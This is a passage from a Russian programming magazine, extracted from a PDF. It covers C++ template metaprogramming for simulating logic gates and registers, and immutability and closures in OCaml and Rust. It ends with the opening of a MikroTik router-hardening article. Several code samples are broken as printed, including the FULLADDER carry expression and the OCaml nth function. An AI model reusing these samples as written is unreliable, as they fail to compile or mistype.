и прочими прелестями.
  Вообще говоря, шаблоны вош ли в сос тав язы ка С++ совсем с другими
целями, и их реальные воз можнос ти исследова тели открыли почти что слу‐
чайно. Одной из первых метапрограмм такого рода принято считать прог‐
рамму для определения простоты числа за авторством Эрвина Анруха
из компании  Siemens,  написанную  в 1994  году. Примечательно,  что
для вывода результата в процес се компиляции программы тогда исполь‐
зовались сообщения об ошибках. Весь ма символично.
  Впрочем, за четверть века метап рограммирова ние в С++ прошло долгий
путь, так что сегодня такие ухищрения уже не понадобятся. Но парочку трюков
применить все равно придется. Без этого было бы не так инте ресно, сог‐
ласен?


TEMPLATE TEMPLE
Итак, нам предстоит реализовать множес тво логических опе раций вре мени
компиляции с помощью шаб лонов. Компилятором был выб ран (вернее, ока‐
зался) GCC, с опцией ‐std=c++17 для расширенной поддержки метап‐
рограммирования. Не так давно Комитет по стандартизации языка принял
в Праге новую версию С++20, но ожидать, что все производители компилято‐
ров ее поддержат, наверное, пока рановато.
  И последнее замеча ние, прежде чем мы перейдем непосредственно
к коду, для тех, кто мало зна ком с шаблонами С++. Нужно понимать, что прог‐
раммирование на шаблонах представляет собой работу с типами, а не
с переменными, как обычно. Взаимоотношения между шаблоном, типом,
классом и объектом клас са (переменной) мы обсудим чуть ниже, ну а пока
заведем пароч ку структур для представления нуля и единицы в нашей
будущей библиотеке логических элементов.


#include <iostream>
#include <type_traits>
#include <tuple>


using std::cout;
using std::endl;


struct I {
  /* HIGH, TRUE, ONE */
};


struct O {
  /*LOW, FALSE, ZERO */
};

Обрати внимание, что здесь мы только определили две  структуры —
без каких‐либо конкретных переменных. Структура представляет собой тип
в программе, и именно отличие типа I от типа O будет определять различие
в состояниях бита в наших цифровых схемах.
  Пойдем дальше и создадим пару байтов с помощью встроенных в язык
кортежей (они появились в С++11). Для этого используем директиву using,
которая по сути представляет собой продвинутый вариант typedef из язы ка
С. Опять же важно заметить: с их помощью мы не создаем новой перемен‐
ной, а только лишь объявляем некоторый новый тип.


using op1 = std::tuple< O, O, O, O, I, O, I, I >;
using op2 = std::tuple< O, I, O, O, O, O, I, O >;

Выведем наши типы на экран и убедимся, что все работает без ошибок.
Здесь мы впервые применяем шаб лон функции, чтобы в зависимос ти
от параметра шаблона выводить на экран нули и еди ницы. Пока ничего слож‐
ного.


template<typename T>
void _print();


template<>
void _print<O>() {
  cout << "O " << endl;
}


template<>
void _print<I>() {
  cout << "I " << endl;
}

Настало время перейти к логическим элементам. Если ты читал мои статьи
из цикла «Основы цифровой схемотехники», то наверняка помнишь, что опе‐
рация И‐НЕ (NAND) образует полноценный базис, на основе которого можно
в дальнейшем строить любые другие схемы. Я хочу как можно быстрее
получить возможность проектировать новые вентили из уже име ющихся,
поэтому начнем с И‐НЕ.


template<typename A, typename B>
struct NAND {
  using result = std::conditional_t<(std::is_same<A, B>::value &&
    std::is_same<A, I>::value), O, I>;
};

В целом не самый сложный кусочек кода, но на всякий слу чай разберем его
подробнее, чтобы в дальнейшем не возвращать ся к оче видным вещам. Тут
мы объявляем шаблон структуры с двумя шаб лонными параметрами. В сос‐
таве этой структуры единс твенное «поле» — директива  using, которая
выводит тип результата как воз вращаемое зна чение шаблона std::condi‐
tional_t.
   Этот шаблон име ет вид std::conditional_t<условие,  тип1,  тип2>
и по сути является аналогом тернарного оператора ? : из стандартного С++.
Если условие (первый параметр) принима ет зна чение true, то возвращается
тип1 (второй параметр), иначе — тип2 (третий параметр).
  По аналогии с тернарным оператором инструкции std::conditional_t
можно вкладывать друг в друга, формируя тем самым выбор сразу из нес‐
кольких доступных вари антов. Более того, можно совмещать последователь‐
ности std::conditional с тернарными операто рами в качестве выражения
для выведения первого параметра. Таким образом, у нас есть пол ноценная
возможность  программировать  нетривиальную  логику  элементов.  Хотя,
конечно, монструозный вид подобных конс трукций несколько нас тораживает
(спойлер: то ли еще будет!).
  Шаблон std::is_same гораз до три виальнее в применении и банально
сравнивает типы в своих угло вых скобках. Зна чение результата (логический
ноль или единица) можно заб рать из его поля value.
   Тут возникает первая воз можность «грязного» хака. Формально ничто
не мешает нам не сравнивать типы наших шаб лонных параметров напрямую.
Мы вполне можем определить шаблон функции, которая бы сводила наши
пользовательские типы к стандартному типу bool, и, таким образом, строить
логику и внутреннее представление элемента на его основе.


template<typename T>
bool state();


template<>
bool state<O>() {
  return false;
}


template<>
bool state<I>() {
  return true;
}


template<typename A, typename B>
struct NAND {
  using result = std::conditional_t<(state<A>() == state<B>()) &&
    (state<A>() == true), O, I>;
};

Но я так делать, конечно, не буду. Это все равно что играть в виде оигры
на легком уровне сложности — никакой радос ти от дос тижения результата.
  Код для всех остальных базовых бло ков выводится уже с помощью нашей
структуры NAND.


template<typename A, typename B = A>
struct NOT {
  using result = typename NAND<A,A>::result;
};


template<typename A, typename B>
struct AND {
  using result = typename NOT<typename NAND<A, B>::result>::result;
};


template<typename A, typename B>
struct OR {
  using result = typename NAND<typename NOT<A>::result,
    typename NOT<B>::result>::result;
};


template<typename A, typename B>
struct NOR {
  using result = typename NOT<typename OR<A, B>::result>::result;
};


template<typename A, typename B>
struct XOR {
  using result = typename NAND<typename NAND<typename NAND<A, B>::
result, A>::result, typename NAND<typename NAND<A, B>::result, B>::
result>::result;
};

В целом понять, почему некоторые критику ют механизм шаблонов в С++, уже
можно. Считая угловые скобочки в выражении для вентиля XOR, невольно
даже проникаешься мыслью, что часть этой критики впол не объ ективна
и обоснованна. Слабые духом личности в этот момент переходят на Python
или JS, но мы не сдаемся.
  В самом деле, не все так плохо. Располагая базовыми блоками, собрать
полусумматор и сумматор достаточно прос то.


template<typename A, typename B>
struct HALFADDER {
  using sum   = typename XOR<A, B>::result;
  using carry = typename  AND<A, B>::result;
};


template<typename A, typename B, typename C = O>
struct FULLADDER {
  using sum = typename HALFADDER<typename HALFADDER<A, B>::sum, C>::
sum;
  using carry = typename OR<HALFADDER<A, B>::carry, HALFADDER<A, B>::
sum, C>::carry>::value;
};

Обрати внимание, что в нес кольких местах при описании списка шаблонных
параметров шаблона мы зада ем параметры по умолчанию. Это упрощает
интерфейс наших логических элементов. В дальнейшем я планирую исполь‐
зовать шаблоны этих структур как шаб лонные параметры структуры регис‐
тров. И тут унифицированный интерфейс придет ся как нельзя кстати.
  Действительно,  стандартно функция  отри цания НЕ  (NOT)  при нимает
на вход только один параметр. Но в целях стандарти зации мы уни фици руем
ее список шаблонных параметров с остальными вентилями, добавляя второй
«вход В», чтобы иметь воз можность при менять ее даже в тех местах, где тре‐
буются два входа. Аналогично и с шаблоном сумматора.


В УШАХ — БИТ, В КЛАССЕ — ТИП
Прежде чем мы перейдем к рассмотрению вложенных шаблонов структур
(классов) и шаблонов в качес тве параметров шаблонов (в том числе исполь‐
зованию шаблона контейнера std::tuple), предлагаю сделать небольшое
лирическое отступление и более детально рассмотреть взаимоотношения
между нашими абстрактными категориями.
   Как правило, мало у кого воз никают трудности с восприятием переменных
в программе (за исключением, быть может, переменных — указате лей
на переменные). Любая переменная (если ее в процес се без жалостно
не отоптимизировал компилятор) рас полага ется  в памяти и занимает
какое‐то количество байтов. Где именно эта переменная оказалась — на сте‐
ке, в куче или в статической памяти, не столь уж и важно.
   Тип переменной, напротив, в прог рамму никак явно не попал. В методо‐
логии ООП, которой ста раются придерживаться в С++, класс представляет
собой тип, а конкретный объект клас са — переменную, сконструированную
по некоторому шаблону. Сколько полей имеет объект, какие права дос тупа
к ним — все это содержится в определении клас са.
   Таким образом, прин цип шаблонов, порож дающих новые сущности,
на самом деле появ ляется в нашей программе гораздо раньше (под другим
именем, но это уже детали). Шаблоны клас сов, в свою очередь, не определя‐
ют какой‐либо новый тип. Но они определяют принцип, по которому этот тип
может быть сконструиро ван.
  Сам по себе шаблон структуры NAND не имеет смысла далее в нашей прог‐
рамме, за исключением применения в каком‐либо списке параметров
в качестве шаблонного парамет ра шаб лона. Что именно интересует ком‐
пилятор после его определения, так это конкретиза ция шаблонной структуры
NAND с помощью существующих типов. В нашем случае это O и I. Только тогда
появляется новый тип (при усло вии, что определение шаблонной структуры
допускает такое исполь зование).
  Резюмируя: в метапрограммировании С++ шаблон — это тип, а тип —
это переменная. В сущности, не так уж и сложно.


РЕКУРСИЯ — БЕССЕРДЕЧНАЯ ТЫ...
Наша основная проб лема — переменные в их изна чальном, «традици онном»
понимании отсутствуют. У нас есть параметры шаб лона (они могут быть
целочисленными) — но это немного не то. Параметры определя ют конкрет‐
ный тип, а внутри этого типа они константны. Чтобы проиллюс трировать это,
попробуем итерировать наш кортеж (он же «байт») и вывести его на экран.


using byte = std::tuple< O, I, O, I, O, I, O, I>;


template<int N>
struct bit {
  static void out() {
    print<std::tuple_element_t<N, byte>>();
  }
};

Это слабо приблизило нас к успеху. Нам по‐прежнему нужно прой тись
по битам от нуля до семи, что бы напеча тать их состояния. Циклы while
или for решили бы нашу проб лему, но они требуют «нас тоящих» переменных.
Блеск и нищета «плюсовых» шаблонов в этот момент вид ны особенно
отчетливо.
   Как ты наверняка уже догадался, нас спа сет рекурсия. Мы рекурсивно
пройдем в нашей структуре каж дый элемент, ровно до точки выхода, которую
придется конкретизировать для шаб лона структуры. Это завершит стек
вызовов, и компилятор пройдет обратно, формируя код для вывода элемен‐
тов кортежа на экран.
  Посмотрим, как это выглядит на практике.


template<typename T, int N = std::tuple_size<T> ‐ 1>
struct print {
  static void out() {
    print<T, N — 1>::out();
    _print<std::tuple_element_t<N, T>>();
  }
};


template<typename T>
struct print<T, 0> {
  static void out() {
    _print<std::tuple_element_t<0, T>>;
  }
};

Сам вывод на экран придется осуществить в рантайме. Аналогом потока
cout, наверное, могла бы стать печать отладочных сообщений вре мени ком‐
пиляции, типа директивы преп роцес сора #warning или static_assert.
Но эксперименты с этим я, пожалуй, отложу на следующий раз.


int main() {
  cout << "Byte is: ";
  print<byte>::out();
  cout << endl;
}



  $ g++ tmpl.cpp ‐Os ‐o tmpl ‐std=c++17
  $ ./tmpl
  Byte is: O I O I O I O I



ШАБЛОННЫЙ ШАБАШ
Теперь перейдем к основной части, ради чего все, собственно, и затевалось.
Я бы хотел в своем симуляторе оперировать не отдельными логичес кими
вентилями, а целыми бло ками. Пример но как микросхемы объ единяют нес‐
колько элементов в одном корпусе, я планирую использовать регистры,
в основу которых лягут наши шаблоны NAND, OR, AND и другие.
  При этом ширина регистра — это параметр, тип используемой функции —
параметр (шаблонный параметр шаблона, если точнее), операнды — тоже
параметры. Ах да, скорее всего, еще потребуется рекурсия и связанный с ней
счетчик. Еще один параметр. Ну и совсем хорошо, если это будет вменяемо
выглядеть. В целом меня устроит какой‐то такой синтаксис:


using result = BYTE::XOR::OP<OP1, OP2>::result;

Здесь BYTE — это ширина результата (восемь бит), XOR — тип используемой
логической функции (исключающее ИЛИ), OP1 и OP2 — операнды (существу‐
ющие к этому моменту в программе), а result — конечный результат вычис‐
лений. По‐моему, достаточно симпатично. По сути, нам удалось сократить
число параметров до двух, как и число угловых ско бочек.
   Начнем с простого.


template<int D>
struct DIM {  /* result's width */
  template<template <typename, typename> class T0>
  struct EXP {  /* type of expression */
    template<typename OP1, typename OP2 = OP1>
    struct OP {  /* operands */
      ...
    };
  };
};

Теперь нам нужно определить выражение для вычисления результата.
Собирать результат будем итеративно, по битам, поэтому сперва выведем
его.


template<int N>
using bit = typename T0<std::tuple_element_t<N, OP1>,
  std::tuple_element_t<N, OP2>>::result;

Мы забираем по эле менту из кортежей наших операндов и при меняем к ним
битовую логическую операцию. Это понятно, но как нам теперь собрать весь
байт результата (или нес колько)?
  Предположим, что у нас уже есть один бит. Значит, нужно вычислить
остальные. Они к нам придут в формате кортежа, который нужно будет «скле‐
ить» с нашим промежуточным результатом в новый кортеж. И так по цепочке,
пока мы не пройдем весь регистр до двух крайних битов, из которых можно
будет сде лать обычный кортеж прямо на месте. Это и будет условием выхода
для нашей рекурсии.
  Выразим все в коде.


template<int N = D>
using result = decltype(std::tuple_cat(std::declval<std::tuple<bit<N>
>>(),
  std::declval<typename  DIM<D>::template
  typename EXP<T0>::template
  typename OP<OP1, OP2>::template
  result<D ‐ 1>>()));

Думаю, без комментариев тут обойтись не получится. Мы склеиваем кортеж
с помощью функции std::tuple_cat. Так как она возвращает некоторое
промежуточное представление нашего кортежа, мы используем decltype
для получения действительного типа результата. Кроме того, уже имеющийся
бит мы тоже оборачиваем в кортеж, чтобы его можно было использовать
в функции конкатенации. Дополнитель но нам помогает шаб лон std::de‐
clval — он возвращает тип результата, который мы могли бы получить,
если бы дело происходило в рантайме.
  Осталось разоб раться с «хвос том». Это гро моз дкое выражение по сути
означает следующее: «я хочу получить тип результата (typename), который
образуется в конкретном шаб лонном варианте структуры DIM, содержащей
результат во вложенном шаб лоне (template) другой структуры (typename),
которая, в свою оче редь, содержит…» и так далее. Думаю, принцип ты понял.
Остается только выяснить, будет ли это работать?
   Нет, не будет. Мы забыли про рекурсию. Она требует свой собс твенный
шаблонный параметр и, как мы обсужда ли, усло вие выхода, реализованное
в качестве конкретизации шаблона некоторым значени ем. Наша проблема
в том, что частичная конкретиза ция вло женного шаб лона (без конкретизации
внешних шаблонов) запрещена стандартом языка. Такие дела: либо опре‐
деляй все полностью, либо никак.
  Поэтому нам придется вытащить параметр условия на верхний уровень,
чтобы была возможность далее определить конкретизацию для самого глу‐
бокого случая (два последних бита результата). Догадал ся до этого я не сра‐
зу, но это и впрямь не самая очевидная вещь.


template<int D, int d = 0>
struct DIM {
  …
  template<int N = d>
  using result = decltype(std::tuple_cat(std::declval<std::tuple<bit<
N>>>(),
    std::declval<typename  DIM<D, N + 1>::template
    typename EXP<T0>::template
    typename OP<OP1, OP2>::template
    result<N + 1>>()));

Теперь определим усло вие выхода для нашего выражения.


template<int D>
struct DIM<D, D ‐ 2> {
  template<template <typename, typename> class T0>
  struct EXP {
    template<typename OP1, typename OP2>
    struct OP {
      template<int N>
      using bit = typename T0<std::tuple_element_t<N, OP1>,
        std::tuple_element_t<N, OP2>>::result;


      template<int N>
      using result = decltype(std::tuple_cat(std::declval<std::tuple<
bit<D ‐ 2>>>(),
        std::declval<std::tuple<bit<D ‐ 1>>>()));
    };
  };
};

Готово, можно выдох нуть. Теперь нашими, кхм‐м, сущностями можно поль‐
зоваться далее в программе.


using value = DIM<8>::EXP<XOR>::OP<byte1, byte2>::result<>;


int main() {
  print<value>();
  cout << endl;
}


ФИНАЛЬНЫЕ ШТРИХИ
Шаблоны работают, но форма записи пока еще далека от совершенства.
Предлагаю ее слегка упростить. Для это го в первую очередь объявим псев‐
донимы для размерности наших регистров.


using BIT   = DIM<1>;
using BYTE  = DIM<8>;   /* Atmel’s AVR simulation */
using WORD  = DIM<16>;  /* Microchip’s PIC24 */
using DWORD = DIM<32>;  /* ARM’s Cortex‐M */
using QWORD = DIM<64>;  /* Intel’s Core family */

Кроме того, псевдонимы можно объявить и для конкретных операций. Я
переименовал NAND, OR и остальные с приставкой из нижнего подчеркивания
и уже в шаблоне DIM добавил их объявления.


using NAND = EXP<_NAND>;
using NOT = EXP<_NOT>;
using AND = EXP<_AND>;
using OR = EXP<_OR>;
using XOR = EXP<_XOR>;

Верхний регистр был выбран везде сознательно, так как символы or, and, not
и остальные зарезервирова ны компилятором для его собственных логичес‐
ких операций. Насколько я помню, это было нововведением стандарта
С++03, но откатываться назад только ради этих символов как‐то не было
желания. Заключительные изменения пришлись на шаблон DIM. Лишний
параметр в списке не давал мне покоя, и я сделал так, чтобы он наследовался
от этой структуры, скрыв его таким обра зом в базовом классе.


template<int D>
struct DIM : public _DIM<D> {
};

Наконец, я убрал угло вые скобочки из поля result и добавил шаблонное
поле для отдельных битов.


using result = _result<0>;


template<int N>
using bit = typename std::tuple_element_t<N, result>;

В результате вызов main выглядит нес колько проще.


using R1 = BYTE::NOT<OP1>::result;
using R2 = BYTE::XOR<OP1, OP2>::result;


int main() {
  print<R1>();
  cout << endl;
  print<R2>();
  cout << endl;
}


ИЛЛЮЗОРНОСТЬ КОДА
Однако самый главный вопрос оста ется открытым: что в итоге? Получится ли
у компилятора разоб рать все наши выражения и не утечет ли часть вычис‐
лений в рантайм? По идее, как будто бы не должна, но лучше проверить.
Для этого в одной папке с файлом tmpl.cpp я создал еще smpl.cpp со сле‐
дующим кодом.


#include <iostream>


int main() {
  std::cout << "O I O O I I O I" << std::endl;
  std::cout << "O O O I I O I O" << std::endl;
}

И скомпилировал их с одними и теми же настройками. Бинарники не совпали
до байта, но оказались практичес ки схожих раз меров. Беглый анализ ассем‐
блерного листинга выявил причину: в tmpl вывод выпол нялся посимвольно,
а в smpl сразу целыми стро ками.



  $stat ‐f "Size: %z" smpl
  Size: 10620
  $stat ‐f "Size: %z" tmpl
  Size: 10652


Как видишь, магия нашей шаб лонной метапрограммы дей ствительно рас‐
сеялась при компиляции, а множественные абс трактные типы бесследно
исчезли, как толь ко дело дошло до реального выполнения. В этом опре‐
деленно что‐то есть, что‐то поэтичес кое и мимолетное. Я только пока
не понял, что именно.


        WWW

                    •Исходники проекта
КОДИНГ
IMMUTABLE

ПОСТИГАЕМ ХИТРОСТИ
НЕИЗМЕНЯЕМЫХ
СТРУКТУР ДАННЫХ
В ФУНКЦИОНАЛЬНЫХ
ЯЗЫКАХ





    Даниил Батурин
 Координатор проекта VyOS
 (https://vyos.io), «языковед»,
  функциональщик, иногда
   сетевой администратор
      daniil@baturin.org





Ряд языков программирова ния заявляют неизменяемость
переменных (immutability) как одну из своих главных фич.
Среди них семейство ML (OCaml, F#, Standard ML) и Haskell,
а также молодые Clojure и Rust. Если ты незнаком с ними, то
наверняка удив лялся: а чем это отличается от const в C
и C++? Давай разложим все по полочкам.


Примеры мы будем писать на OCaml и Rust, чтобы продемонстрировать
сходство и различия реализации этой идеи в разных язы ках. Выполнить при‐
меры на OCaml можно в онлайне на сайте try.ocamlpro.com, а примеры
на Rust — на play.rust‐lang.org.


КРАТКАЯ ИСТОРИЯ ПЕРЕМЕННЫХ
В самый ранний период компь ютерной истории, когда люди писали машин‐
ный код, вся организация памяти программы была на совести программис та
и все адре са тоже приходилось указывать вручную.
   Чуть позже появились ассемблеры, которые поз воляли указывать сим‐
вольные метки вместо числовых адресов. Возьмем пример на условном
языке ассемблера и посмотрим, как будет выглядеть вывод строки hello
world в бесконеч ном цикле.


msg:
  .ascii "hello world"


foo:
  push msg
  call print
  jmp foo

Лю бой современный ассемблер за нас придумает, как разместить в памяти
строку hello world и машинные инструкции, а метку foo в jmp foo заменит
реальным адресом инструкции push msg в памяти. Затем компоновщик (link‐
er) подставит вместо наз вания функции print ее реальный адрес в биб‐
лиотеке, но это другая история. Это первый уро вень абс тракции по срав‐
нению с машинным кодом.
  Первые версии фор трана и прочих ранних языков были скорее развитыми
макроассембле рами, чем компиляторами в современном понимании. Даже
С на момент своего появления транслировал каждый опе ратор языка
в одну‐две машинные команды PDP‐11.
  Безопасность памяти в языках ассемблера отсутствует: можно записать
любые данные по адресу любой метки, и последс твия проявятся только
во время выполнения. С тех пор языки развивались в сторону большей абс‐
трактности и  выразительности:  появилась  воз можность  указать смысл
переменных и ограничить их вероятные значения с помощью типов.
  Неизменным оставалось одно: каждое имя переменной свя зано с опре‐
деленным участком памяти или как минимум одними и теми же данными.
Присваивание нового значения в императивном программировании всегда
затирает старые данные в памяти и заменяет их новыми.
  Наибольшие сложности это вызывает, когда компилятор начинает при‐
менять к переменным оптимизации. Если содержимое памяти может изме‐
ниться в любой момент, судить о том, можно ли заинлайнить значение
переменной, непросто.
  Еще сложнее становятся задачи вроде undo и redo. Если ты пишешь тек‐
стовый или графический редактор с возможностью отменить изменения,
в языке вроде C есть только два варианта: хра нить каждую версию данных
либо    явно    хранить   список   выпол ненных   опе раций   вроде
DeleteLineRange(10,11) и ApplyFilter(Blur, radius=2).
  Даже в более простых задачах может оказаться, что функции из биб лиоте‐
ки модифицируют существующие данные,  и, если оригинальные данные
еще  понадобятся,  их  приходит ся  копировать  целиком.  Популярность
copy.copy() и copy.deepcopy() в коде на Python — яркое тому подтвержде‐
ние.


КОНСТАНТЫ
Механизм констант в языках вроде C — первый маленький шаг к неизменя‐
емым переменным. Если мы пишем const int foo = 17, у компилятора
есть гарантия, что значение, связанное с именем foo, никогда не изме нится
во время выполнения. Это поз воляет безопас но оптимизировать код таким
образом, что ассоциации имени foo или зна чения 17 с каким‐то адресом
в памяти там не останется — во всех выражениях вроде bar = foo*2 слово
foo будет просто заменено на зна чение 17. С данными большей сложности
и размеров такая наивная оптимизация уже не работает, но простор
для оптимизаций все равно больше, чем с изменяемыми переменными.
  Остается одно главное огра ничение — имена констант связаны с опре‐
деленными значениями для всей программы или модуля. Именно это огра‐
ничение и снимают неизменя емые переменные.


Связывание имен со значениями и области видимости
Возможности языков обычно работают не в изоляции, а вмес те. Не делать
постоянной связь имен со зна чениями можно, если соз дание новых областей
видимости (scope) будет прос тым и «дешевым».
   Часто для связывания (binding) имени со зна чением используют синтаксис
вроде let name = value и его вариации. Каж дое связывание откры вает
новую область видимости. Посмотрим при мер на OCaml.


(* Scope 0 *)
let x = "hello"
let () = Printf.printf "%s" x


let x = " world"
(* Scope 1 *)
let () = Printf.printf "%s\n" x

Или похожий пример на Rust.


fn main() {
    // Scope 0
    let x = 5;
    println!("The value of x is: {}", x);


    let x = x + 1;
    // Scope 1
    println!("The value of x is: {}", x);
}

Это очень простой пример, который отличается от const в C только тем, что
нам не пришлось выдумывать новое имя для каждого нового значения. В обо‐
их случаях ком пилятору понятно, что за предела ми области видимос ти
Scope 0 (после второго let) старое значение x никем не используется
и выделенную под него память можно безопас но освободить или вовсе
не выделять под него память динамически.
   Гораздо инте реснее случаи, ког да имена используются заново, а старые
данные остаются жить в памяти.


ЗАМЫКАНИЯ
Области видимости называются лек сическими, если значение переменной
навсегда определяется мес том, где она определена, и не может изме ниться
в будущем. Применение таких областей видимости делает возможны ми за-
мыкания — функции, которые захватыва ют переменные из контекста, где
были созданы.
  Продемонстрировать это можно, если сна чала определить переменную
и использовать ее в функции, а затем переопределить и использовать в дру‐
гой функции. Вот пример на OCaml.


(* Scope 0 *)


let msg = "hello world"
(* Scope 1 *)


let greeting () = Printf.printf "%s\n" msg


let msg = "bye world"
(* Scope 2 *)


let farewell () = Printf.printf "%s\n" msg


let () = greeting (); farewell ()

Программа выведет сна чала hello  world, затем bye  world. Функции
greeting и farewell ссылаются на одно и то же имя переменной msg. Клю‐
чевой момент в том, что выражение let msg = "bye world", которое откры‐
вает область видимости Scope 2, никак не влияет на предыдущие области
видимости.
  Для функции greeting переменная msg связана со значением hello
world, и это значение оста нет ся в памяти прог раммы, хотя уже не связано
ни с каким име нем.
  Синтаксис let greeting () = ... — это синтаксичес кий сахар для свя‐
зывания анонимной функции с именем, и «подлинная форма» этих выражений
была бы let greeting = fun () ‐> .... Пос кольку в OCaml и Haskell все
функции являются замыка ниями и захватыва ют зна чения из своей области
видимости, там нет причин использовать более длинную форму.
  В Rust существуют как лексичес кие области видимости, так и динамичес‐
кие, в которых значение переменных определяется местом вызова функции.
Функции, созданные с помощью ключево го сло ва fn, ведут себя как функции
в стиле C, и попытки сослать ся на созданную с помощью let переменную
вызовут ошибку компиляции (смотри rustc ‐‐explain E0434). Замыкания
в нем можно создать, явно свя зав ано нимную функцию с именем.
   Вот пример синтаксиса анонимных функций в Rust.


|параметр| ‐> тип {выражение}

В качестве типа для функций, которые не воз вра щают полезных значений,
используется тип unit с единственным значени ем (). В OCaml, если мы хотим
явно указать тип функции, он так и будет называться unit.


let greeting : unit ‐> unit = fun () ‐> print_endline "hello world"

В Haskell и Rust токен () исполь зует ся и для названия этого типа. Кроме того,
в Rust указывать тип ано нимных функций обя зательно, поэтому синтаксис
анонимной функции без воз вра щаемого значения будет || ‐> () { ... }.
  Воспользовавшись этими знаниями, напишем аналог нашей программы
на Rust.


fn main() {
    // Scope 0
    let msg = "hello world";
    let greeting = || ‐> () { println!("{}", msg) };


    let msg = "bye world";
    // Scope 1
    let farewell = || ‐> () { println!("{}", msg) };


    greeting();
    farewell();
}

Если ее выполнить, результат будет такой же, как у примера на OCaml.


Замыкания как форма инкапсу ляции
Сочетание замыканий с из меняемы ми переменными позволяет реали‐
зовать инкапсуляцию без необходимос ти прибегать к средствам ООП и кон‐
тролю за доступом к полям объекта.
  Для следующего примера нам нужно знать, что изменяемую переменную
(ссылку) в OCaml можно соз дать функцией let myrref = ref $value,
а получить ее значение — оператором !myref.
  Мы напишем функцию, которая создает функцию‐счетчик, увеличивающий
свое значение при каждом вызове:


let make_counter initial_value =
  let counter = ref initial_value in
  fun () ‐> let () = counter := !counter + 1 in !counter


let my_counter = make_counter 0


let () =
  Printf.printf "%d\n" (my_counter ());
  Printf.printf "%d\n" (my_counter ());
  Printf.printf "%d\n" (my_counter ())

При выполнении программы в выводе мы увидим 1 2 3. Каждый раз, когда
мы вызываем make_counter, она создает изменяемую переменную и фун‐
кцию, которая ее увеличивает и воз вра щает новое значение. При этом извне
той функции counter ничто не может ни изменить значение счетчика, ни про‐
читать его без увеличения.
   Такого же эффекта можно добить ся и без изменяемых переменных, если
возвращать не одно значение, а кортеж из нового значения и новой функции.


СТРУКТУРЫ ДАННЫХ
Пока что мы работали только со значениями примитивных типов, а теперь
посмотрим на структуры данных. В OCaml, Haskell и Rust они реализуются
с помощью кортежей и типов‐сумм (sum type, tagged union) вроде


type cmyk_color = Key | CMY_Color of (int, int, int)

В качестве примера рассмотрим односвязный спи сок. Связ ные спис ки так
широко применяются для построения неизменяемых структур данных, что
для них OCaml и Haskell предос тавляют встроенный синтаксис. Общий смысл:
список может быть пустым либо состоять из головы и хвоста — пары из зна‐
чения и другого списка (воз можно, пустого). Смотри, как это будет выглядеть
в условном синтаксисе.


type 'a list = [] | 'a :: 'a list

В OСaml можно писать let xs = [1; 2; 3], что будет синтаксичес ким
сахаром для 1 :: (2 :: (3 :: [])).
  В отличие от списков в Python или Ruby, такая реализация представляет
собой именно односвяз ный список и не позволя ет получать произвольный
доступ к любому элементу (и уж тем более — их модифицировать). Безопас‐
ность памяти — первое очевидное преимущес тво.
  Менее очевидное преимущество в том, что создание нового спис ка
из существующе го через добавление нового элемента в его начало безопас‐
но для старых данных. Посмотрим на пример.


let xs = [2; 3]


let ys = 1 :: xs (* ys = [1; 2; 3] *)

Поскольку никакого способа изменить  что‐то  внутри исходного списка
xs = [2;3] не существу ет, в памяти программы новый список ys будет сос‐
тоять из значения 1 и ука зателя на ста рый список xs. Компилятор знает, что
это безопасно, и не выделяет память под новый спи сок.
   Если эле мен ты списка сами по себе большие, экономия памяти с таким
подходом может получиться весь ма зна чительной. При этом хранение пре‐
дыдущих версий списка не вызывает никаких слож ностей, дос таточно сох‐
ранять их в отдельных переменных — в памяти программы это опять же будут
просто указатели на отдель ные части нового боль шого списка.
  Первый очевидный недостаток — в большей алгоритмичес кой сложности
типичных операций. Например, получить элемент с номером n можно, только
пройдя первые n элементов:


let rec nth n xs =
  match xs with
  | [] ‐> None
  | y :: ys ‐>
    if n = 0 then y
    else nth (n ‐ 1) ys

Второй недостаток в том, что некото рые алго ритмы приведут к неявному
копированию всего списка значений в новый участок памяти. К примеру,
перевернуть список можно, только соз дав новый на основе старого.
  Насколько эти недостатки значительны, зависит от задачи и от того, с чем
сравниваем. Посколь ку OCaml, Haskell и Rust компилиру ются в машинный код
и организация памяти для таких типов оказыва ется куда компактнее, чем
для объектов в Python или Ruby, производительность может быть выше, нес‐
мотря на формально большую сложность алгоритма. Кроме того, если ста‐
рый список все еще нужен для других целей, память все равно пришлось бы
копировать. Здесь это хотя бы не требует нашего явного участия.
  Тем не менее при творческом подходе можно улучшить производитель‐
ность неизменяемых структур данных и привести ее к O(1) для определенных
операций. К примеру, отсутс твие быс трого произволь ного доступа к элемен‐
там можно компенсировать с помощью так называ емых зипперов. Zipper —
это кортеж из двух частей структуры данных и ее элемента, с которым мы
в данный момент работа ем.


type 'a list_zipper = 'a list * 'a * 'a list

С помощью зипперов можно реализовать программу вроде текстового
редактора или оконного менеджера в чисто функциональном сти ле, не силь‐
но жертвуя при этом производитель ностью. Когда пользователь переходит
к другой строке, «окно» зиппера сдвигается, таким образом время доступа
к текущей строке в любой момент одинако во.


ЗАКЛЮЧЕНИЕ
Мы рассмотрели только самые основы, но я надеюсь, что эти знания помогут
тебе в изучении популярного ныне Rust или классичес ких OCaml и Haskell.
  К структурам данных мы только прикоснулись, но, помимо зиппера, сущес‐
твуют и другие способы соз давать структуры с пос тоянным средним вре‐
менем доступа. Из двух списков можно создать очередь, а массив с доступом
по номеру элемента сделать из двоичного дерева поис ка. За деталя ми обра‐
щайся к книге Криса Ока саки Purely Functional Data Structures или его дис‐
сертации.
АДМИН

   ЗАЩИЩАЕМ
      MIKROTIK

              ХИТРОСТИ БЕЗОПАСНОЙ
                 НАСТРОЙКИ РОУТЕРА





                                                                       Дмитрий Бубнов
                                                                                Тренер Mikrotik. Автор канала
                                                                                                         https://t.me/mikrotikninja
                                                                                        dv@bubnovd.net





Ошибки в прошивках популярных роутеров обнаруживают
регулярно. Однако просто найти баг недостаточно, его
еще нужно обезвредить. Сегодня мы поговорим о том,
как  обезопасить  себя  от  уже  известных  уязвимостей
в RouterOS и защититься от тех, которые выявят в будущем.


             INFO

                     Подробный  рассказ  об  известных  на  сегод‐
                     няшний день багах в RouterOS ты можешь найти
                        в статье «Опасный MikroTik. Разбира емся в уяз‐
                      вимостях популярных роутеров».



ОБНОВЛЕНИЯ
Несмотря на страшные описания и действительно большую опасность,
которую таят в себе уяз вимос ти, стоит отдать дол жное разработчикам
MikroTik: они в кратчайшие сроки выпускают патчи. Многие дыры закрываются
еще до их утечки в паблик, оставшиеся — в течение дня‐двух. Поэтому пер‐
вое, на что нужно обратить внимание, — актуальность версии RouterOS
